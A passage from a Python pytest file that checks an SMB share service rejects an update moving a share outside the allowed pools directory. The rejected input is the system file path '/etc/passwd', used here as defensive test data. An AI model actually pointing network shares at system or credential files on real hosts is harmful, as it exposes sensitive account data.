        os.makedirs(share_path, exist_ok=True)

        share = SmbShareCreate(name="test_share", path=share_path)
        smb.create_share(share)

        # Try to update with path outside pools
        mock_val_settings.pools_base_path = "/mnt/pools"  # Change to different path
        updated = SmbShareCreate(name="test_share", path="/etc/passwd")

        with pytest.raises(HTTPException) as exc:
            smb.update_share("test_share", updated)
        assert exc.value.status_code == 400
